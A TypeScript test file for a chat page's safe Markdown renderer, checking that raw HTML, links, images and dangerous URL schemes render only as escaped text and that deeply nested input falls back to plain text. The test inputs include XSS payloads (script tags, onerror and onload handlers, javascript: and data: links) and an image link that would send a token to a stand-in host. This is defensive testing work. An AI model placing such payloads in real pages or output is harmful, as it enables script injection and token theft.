// Tests of the safe Markdown rendering of the Chat page (#492). Run: npm test (node --test).
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync } from 'node:fs'
import { createElement } from 'react'
import { renderToStaticMarkup } from 'react-dom/server'
import ReactMarkdown from 'react-markdown'
import { MAX_BRACKETS, MAX_DEPTH, MAX_RUNS, PlainOnError, markdownElement, options, tooDeep, tooNested } from '../src/markdown.ts'

const html = (md: string) => renderToStaticMarkup(createElement(ReactMarkdown, options, md))
// text as React escapes it in the markup
const esc = (s: string) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;')

test('headings, a list, a GFM table and a fenced code block are formatted', () => {
  const out = html([
    '# Plan', '', 'Some **bold** and *italic* and `code`.', '',
    '## Steps', '', '1. first', '2. second', '   - nested', '', '- [x] a', '- b', '',
    '| Name | Size |', '|:-----|-----:|', '| a | 1 |', '| `b\\|c` | 2 |', '',
    '```go', 'func main() {', '\tfmt.Println("<b>")', '}', '```', '',
    '> quoted', '', '---',
  ].join('\n'))
  for (const re of [
    /<h3>Plan<\/h3>/, /<h4>Steps<\/h4>/, /<strong>bold<\/strong>/, /<em>italic<\/em>/, /<code>code<\/code>/,
    /<ol>\s*<li>first<\/li>/, /<li>second\s*<ul>\s*<li>nested<\/li>/, /<ul[^>]*>\s*<li[^>]*>\s*a<\/li>/,
    /<table>/, /<th[^>]*left[^>]*>Name<\/th>/, /<td[^>]*right[^>]*>1<\/td>/, /<td[^>]*><code>b\|c<\/code><\/td>/,
    /<pre><code[^>]*>func main\(\) \{\n\tfmt\.Println\(&quot;&lt;b&gt;&quot;\)\n\}/,
    /<blockquote>\s*<p>quoted<\/p>\s*<\/blockquote>/, /<hr\/>/,
  ]) assert.match(out, re)
  // the task list checkbox is not an element
  assert.doesNotMatch(out, /<input/)
})

test('raw HTML, links and images render no element: only text with the address', () => {
  const out = html([
    '<script>alert(1)</script>',
    '<img src=https://evil.example/a.png onerror=alert(1)>',
    'inline <a href="https://evil.example/x">click</a> and <iframe src="https://evil.example/f"></iframe>',
    '![secret](https://evil.example/leak?d=token)',
    '[**docs**](https://evil.example/docs "title")',
    '<https://evil.example/auto> www.evil.example/www [x](javascript:alert(1))',
    '[used][ref] and ![pic][ref] and a note[^1]',
    '[ref]: https://evil.example/ref',
    '[^1]: https://evil.example/note',
  ].join('\n\n'))
  assert.doesNotMatch(out, /<(a|img|script|iframe|input|sup|section)[\s/>]/i)
  // an attribute has a quoted value in the markup; escaped text has &quot; instead
  assert.doesNotMatch(out, /\s(href|src|on\w+)="/i)
  for (const s of [
    '<script>alert(1)</script>', '<img src=https://evil.example/a.png onerror=alert(1)>',
    '<a href="https://evil.example/x">', '<iframe src="https://evil.example/f">',
    'secret (image: https://evil.example/leak?d=token)', '<https://evil.example/auto>', 'www.evil.example/www',
    'x (javascript:alert(1))', '[used][ref]', '![pic][ref]', '[^1]', '[ref]: https://evil.example/ref',
    '[^1]: https://evil.example/note',
  ]) assert.ok(out.includes(esc(s)), `missing text: ${s}`)
  assert.ok(out.includes('<strong>docs</strong> (https://evil.example/docs)'))
  // HTML inside a table or a code block stays text too
  assert.match(html('| a |\n|---|\n| <img src=x> |'), /<td>&lt;img src=x&gt;<\/td>/)
  assert.match(html('```\n<img src=x>\n```'), /<code>&lt;img src=x&gt;\n<\/code>/)
})

test('dangerous schemes, nested images and HTML tricks stay text (#494)', () => {
  const out = html([
    '[a](javascript:alert(1)) [b](JaVaScRiPt:alert(1)) [c](&#106;avascript:alert(1)) [d](java\tscript:x)',
    '[e](data:text/html;base64,PHNjcmlwdD4=) [f](vbscript:msgbox(1)) [g](//evil.example/x)',
    '[![img](https://evil.example/p.png)](https://evil.example/q)',
    '<!-- <img src=x onerror=alert(1)> -->',
    '<svg onload=alert(1)><style>body{}</style><form action=x><button>b</button></form>',
    '<details open ontoggle=alert(1)><summary>s</summary></details>',
    '<object data=x></object><embed src=x><video src=x></video><audio src=x></audio><link rel=stylesheet href=x><meta http-equiv=refresh content=0>',
    '**<b onmouseover=alert(1)>x</b>** `<script>` _<i>y</i>_',
  ].join('\n\n'))
  assert.doesNotMatch(out, /<(a|img|script|iframe|input|svg|style|form|button|details|summary|object|embed|video|audio|link|meta|b|i)[\s/>]/i)
  assert.doesNotMatch(out, /\s(href|src|srcset|action|data|style|on\w+)="/i)
  // only the allowlisted elements appear at all
  const allowed = new Set(['p', 'br', 'h3', 'h4', 'h5', 'h6', 'strong', 'em', 'code', 'pre', 'blockquote', 'ul', 'ol', 'li', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'hr'])
  for (const m of out.matchAll(/<\/?([a-zA-Z0-9]+)/g)) assert.ok(allowed.has(m[1]), `element not in allowlist: ${m[1]}`)
})

test('urlTransform drops every address', () => {
  for (const u of ['https://example.com', 'javascript:alert(1)', 'data:image/png;base64,AA', '/relative']) {
    assert.equal(options.urlTransform?.(u, 'href', { type: 'element', tagName: 'a', properties: {}, children: [] }), '')
  }
})

test('the renderer has no way to make a link, an image, raw HTML or a handler', () => {
  for (const f of ['../src/Markdown.tsx', '../src/markdown.ts']) {
    const src = readFileSync(new URL(f, import.meta.url), 'utf8')
    for (const bad of ['dangerouslySetInnerHTML', 'rehype-raw', 'skipHtml', '<a ', '<img', '<iframe', 'onClick', 'innerHTML']) {
      assert.ok(!src.includes(bad), `${f} contains ${bad}`)
    }
  }
})

test('deeply nested text is detected cheaply and shown plain (#494)', () => {
  const deep = ['- '.repeat(1000) + 'x', '>'.repeat(5000) + ' x', '- '.repeat(5000) + 'x', '1. '.repeat(1000) + 'x',
    '> - '.repeat(600) + 'x', ' '.repeat(200) + '- x', 'a\n' + '>'.repeat(40) + ' x']
  const t0 = performance.now()
  for (const s of deep) assert.equal(tooDeep(s), true, s.slice(0, 20))
  assert.ok(tooDeep('- x\n'.repeat(20_000) + '> '.repeat(40_000)))
  assert.ok(performance.now() - t0 < 500, 'tooDeep is slow')
  // ordinary Markdown is not too deep: rules, bold, numbers, a nested list, quotes and code
  for (const s of ['-'.repeat(200), '*'.repeat(200), '**bold** text', '2024. was a year', '- a\n  - b\n    - c',
    '> > > quote', '```\n' + '    '.repeat(10) + 'code\n```', 'x\n'.repeat(1000)]) assert.equal(tooDeep(s), false, s.slice(0, 20))
  // the component renders plain text, fast, without throwing
  for (const s of ['- '.repeat(1000) + 'x', '>'.repeat(5000) + ' x', '- '.repeat(5000) + 'x']) {
    const t = performance.now()
    const out = renderToStaticMarkup(markdownElement(s))
    assert.ok(performance.now() - t < 1000, 'render is slow')
    assert.match(out, /^<div class="agd-msg-text agd-plain">/)
    assert.doesNotMatch(out, /<(ul|li|blockquote)/)
  }
  // nesting under the cap still renders as Markdown
  assert.match(renderToStaticMarkup(markdownElement('> '.repeat(MAX_DEPTH) + 'x')), /agd-md/)
})

test('the error boundary shows plain text when rendering throws (#494)', () => {
  const Boom = () => { throw new Error('boom') }
  const orig = console.error
  console.error = () => {}
  try {
    // renderToStaticMarkup does not run error boundaries, so check the boundary's own contract
    assert.deepEqual(PlainOnError.getDerivedStateFromError(), { failed: true })
    const b = new PlainOnError({ text: '<b>x</b>', children: createElement(Boom) })
    b.state = { failed: true }
    assert.equal(renderToStaticMarkup(b.render() as never), '<div class="agd-msg-text agd-plain">&lt;b&gt;x&lt;/b&gt;</div>')
    b.state = { failed: false }
    assert.equal(b.render(), b.props.children)
  } finally { console.error = orig }
})

test('nested inline text and long text are shown plain, fast (#494)', () => {
  const nested = [
    '['.repeat(5000) + 'x' + '](u)'.repeat(5000), '[!'.repeat(3000) + '[x](u)' + '](u)'.repeat(3000),
    '**'.repeat(4000) + 'x' + '**'.repeat(4000), '*_'.repeat(3000) + 'x' + '_*'.repeat(3000),
    '['.repeat(MAX_BRACKETS + 1) + 'x', '*a '.repeat(MAX_RUNS + 1), '`'.repeat(40),
  ]
  for (const s of nested) {
    assert.equal(tooNested(s), true, s.slice(0, 20))
    const t = performance.now()
    const out = renderToStaticMarkup(markdownElement(s))
    assert.ok(performance.now() - t < 200, `render is slow: ${s.slice(0, 20)}`)
    assert.match(out, /^<div class="agd-msg-text agd-plain">/)
  }
  // ordinary text is not too nested; runs and brackets reset at a blank line
  for (const s of ['**bold** and _it_ and `code` and [x](u) [y]', '[a] [b] [[c]]', '```\ncode\n```',
    ('*a* '.repeat(100) + '\n\n').repeat(10), ('[' + '\n\n').repeat(100), '['.repeat(MAX_BRACKETS) + 'x']) {
    assert.equal(tooNested(s), false, s.slice(0, 20))
  }
  // text over 20,000 characters stays plain
  assert.match(renderToStaticMarkup(markdownElement('a '.repeat(10_001))), /agd-plain/)
  assert.match(renderToStaticMarkup(markdownElement('**a** '.repeat(100))), /agd-md/)
})
